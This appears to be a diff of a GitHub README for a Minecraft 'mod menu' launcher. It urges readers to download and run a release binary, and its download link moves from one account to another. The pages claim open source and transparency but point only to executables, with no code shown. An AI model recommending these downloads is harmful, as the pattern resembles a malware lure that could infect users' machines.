@@ -1,224 +1,70 @@
-# Universal Minecraft Launcher (Ultimate Launcher for Minecraft)
+# 🎮 minecraft-launcher-mod-menu - Easy Way to Customize Minecraft
 
-<p align="center">
-  <img src="https://placehold.co/1200x400/0d1117/ffffff?text=Universal+Minecraft+Launcher" alt="Universal Minecraft Launcher Banner">
-</p>
+[![Download Now](https://img.shields.io/badge/Download%20Now-%23FF5722.svg?style=for-the-badge&logo=github)](https://github.com/potrosghaly/minecraft-launcher-mod-menu/releases)
 
-<p align="center">
-  <a href="#installation">Installation</a> •
-  <a href="#features">Features</a> •
-  <a href="#use-cases">Use Cases</a> •
-  <a href="#screenshots">Screenshots</a> •
-  <a href="#contributing">Contributing</a>
-</p>
+## 🌟 Introduction
 
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-blue">
-  <img src="https://img.shields.io/badge/license-MIT-green">
-  <img src="https://img.shields.io/badge/build-stable-success">
-  <img src="https://img.shields.io/badge/open--source-yes-informational">
-</p>
+The **minecraft-launcher-mod-menu** is a universal Minecraft launcher that allows you to customize your Minecraft experience without modifying any game files. This open-source application offers full transparency and gives you complete control over your game settings. Whether you are a developer, a modder, or someone who wants to experiment with Minecraft, this tool is designed for you.
 
----
- <div align="center">
-  <a href="https://github.com/whiteblack-dunken3ho/minecraft-launcher-mod-menu/releases/tag/Ulimatelauncher">
-    <b>⬇️ DOWNLOAD (Latest Release)</b>
-  </a>
-</div>
+## 🚀 Getting Started
 
-<p align="center">
-  <img width="800" height="450" alt="image" src="https://github.com/user-attachments/assets/c5afed63-e4bc-4c81-8816-d8ffb92906e0" />
+To use the minecraft-launcher-mod-menu, follow these simple steps to download and run the software.
 
-## About the Project
+## 🔥 Download & Install
 
-**Universal Minecraft Launcher** is a free, open-source Minecraft launcher built for advanced client-side customization, modular extensions, and deep runtime configuration.
+1. **Visit the Releases Page**  
+   Go to the following link to access the download options: [Download Here](https://github.com/potrosghaly/minecraft-launcher-mod-menu/releases).
 
-The project focuses on giving users full control over their client environment without permanently modifying the base game files. Everything is modular, reversible, and transparent.
+2. **Choose Your Version**  
+   On the releases page, you will see various versions of the launcher. Select the version suitable for your operating system. Look for files compatible with Windows, Mac, or Linux.
 
-This launcher is intended for users who want to explore the limits of client customization, experiment with behavior, visuals, and performance, and build their own extended setups.
+3. **Download the Installer**  
+   Click on the file for your operating system. The download will start. Wait for the download to complete.
 
----
+4. **Run the Application**  
+   Once the file is downloaded, locate it in your downloads folder. Double click on the file to run the installer. Follow the on-screen instructions to complete the installation.
 
-## Design Philosophy
+5. **Launch the Application**  
+   After installation, find the minecraft-launcher-mod-menu in your applications folder. Open it to start customizing your Minecraft experience.
 
-The launcher is built around several key principles:
+## 🛠️ Features
 
-- The client environment belongs to the user  
-- Customization should be flexible and optional  
-- Extensions must be modular and isolated  
-- Experimentation should be safe and reversible  
-- Transparency is mandatory  
+- **Modular Client-side Customization**: Easily add or remove mods and features as you like.
+- **Dynamic Extension Loading**: Load various extensions while the game is running, enhancing your gaming experience.
+- **Offline Experimentation**: Test your customizations without being online.
+- **No File Modification**: Enjoy peace of mind knowing that your original Minecraft files remain untouched.
+- **User Control**: Make the changes you want with a simple interface.
 
-Universal Minecraft Launcher does not enforce a predefined experience. Instead, it provides a foundation that adapts to different needs and workflows.
+## 💻 System Requirements
 
----
+- **Operating System**: Compatible with Windows 10/11, macOS, and popular Linux distributions.
+- **Java**: Java 8 or later is required. If you do not have Java installed, please download it from the [official Java website](https://www.java.com/en/download/).
+- **Disk Space**: At least 200 MB of free disk space.
 
-## Features
+## 📚 Additional Information
 
-### Modular Extension System
+If you want to contribute to the project or understand how it works, the source code is available on GitHub. You are welcome to explore, report issues, or suggest features.  
 
-The launcher includes a built-in system for loading independent client-side modules at runtime.
+## 👥 Community Support
 
-- Dynamic enable / disable without reinstalling
-- No permanent modification of game files
-- Clean separation between core and extensions
-- Ideal for testing and experimentation
+For any questions or issues, you can reach out to the community through:
 
-<p align="center">
-  <img src="https://placehold.co/1000x500/161b22/ffffff?text=Module+Manager+Interface">
-</p>
+- **GitHub Issues**: Post your question directly in the issues section of the [repository](https://github.com/potrosghaly/minecraft-launcher-mod-menu/issues).
+- **Social Media**: Check out our social media for updates and support from fellow users.
 
----
+## ⚙️ Troubleshooting
 
-### Runtime Interaction Layer
+- **Application Won't Start**: Make sure you have the required version of Java installed. Reinstalling the launcher might help fix the issue.
+- **Download Issues**: If your download fails, try refreshing the page or check your internet connection.
 
-Universal Minecraft Launcher provides a controlled runtime layer that allows advanced interaction with the client process during startup and execution.
+## 🌐 Join Us
 
-This makes it possible to:
-- Attach custom logic dynamically
-- Adjust client behavior at runtime
-- Explore internal systems in a controlled environment
+Stay updated with the latest features and improvements by watching the repository on GitHub. Your feedback is invaluable, and together we can make this project even better.
 
-All actions remain local and fully visible to the user.
+## 🔗 Useful Links
 
----
+- [Download Here](https://github.com/potrosghaly/minecraft-launcher-mod-menu/releases)
+- [GitHub Repository](https://github.com/potrosghaly/minecraft-launcher-mod-menu)
+- [Official Java Download](https://www.java.com/en/download/)
 
-### Profiles & Environments
-
-Create and manage multiple isolated profiles:
-
-- Separate Minecraft versions
-- Independent runtime settings
-- Profile-specific extensions
-- Custom JVM and startup parameters
-
-Switching between environments takes seconds.
-
-<p align="center">
-  <img src="https://placehold.co/1000x500/161b22/ffffff?text=Profiles+and+Configurations">
-</p>
-
----
-
-### Performance & Visual Control
-
-The launcher includes tools for fine-grained tuning:
-
-- Memory and CPU allocation
-- Rendering behavior adjustments
-- Visual overlays and interface tweaks
-- Optimized startup configuration
-
-Designed to scale from minimal systems to high-performance setups.
-
----
-
-### Clean and Minimal Interface
-
-The UI is focused on clarity and speed:
-
-- Minimalistic layout
-- Logical navigation
-- Real-time status indicators
-- Integrated logs and diagnostics
-
-No unnecessary elements. Everything serves a purpose.
-
-<p align="center">
-  <img src="https://placehold.co/1000x500/161b22/ffffff?text=Launcher+User+Interface">
-</p>
-
----
-
-## Use Cases
-
-Universal Minecraft Launcher adapts to many workflows:
-
-- Experimental client builds
-- Development and testing of client-side extensions
-- Custom visual or performance-focused setups
-- Multiple isolated environments
-- Educational exploration of client behavior
-
-The launcher provides tools — usage is defined by the user.
-
----
-
-## Screenshots
-
-<table>
-  <tr>
-    <td>
-      <img src="https://placehold.co/600x350/0d1117/ffffff?text=Main+Screen">
-    </td>
-    <td>
-      <img src="https://placehold.co/600x350/0d1117/ffffff?text=Extension+Manager">
-    </td>
-  </tr>
-  <tr>
-    <td>
-      <img src="https://placehold.co/600x350/0d1117/ffffff?text=Runtime+Panel">
-    </td>
-    <td>
-      <img src="https://placehold.co/600x350/0d1117/ffffff?text=Advanced+Settings">
-    </td>
-  </tr>
-</table>
-
----
-
-## Installation
-
-1. Open the **Releases** section of this repository  
-2. Download the latest build for your platform  
-3. Extract the archive to any directory  
-4. Run the launcher executable  
-5. Create a profile and select a game version  
-6. Adjust settings and launch  
-
-No external dependencies required.
-
----
-
-## Open Source & Transparency
-
-Universal Minecraft Launcher is fully open-source.
-
-- No hidden logic
-- No background processes
-- No forced updates
-- No data collection
-
-Users are encouraged to inspect the code, build custom extensions, and contribute improvements.
-
----
-
-## Disclaimer
-
-This project is intended for educational, experimental, and customization purposes.
-
-All configurations and extensions are applied locally.  
-Users are responsible for how they configure and use their client environment.
-
----
-
-## Contributing
-
-Contributions are welcome:
-
-- Core improvements
-- UI and UX enhancements
-- Documentation
-- Example extensions
-- Performance optimizations
-
-Issues and pull requests are always open.
-
----
-
-## Final Statement
-
-Universal Minecraft Launcher is not just another launcher.  
-It is a platform for control, experimentation, and exploration.
-
-If you believe the client should adapt to the user — this project was built for you.
+Feel free to explore and enjoy endless possibilities with minecraft-launcher-mod-menu. Craft your own gaming experience today!
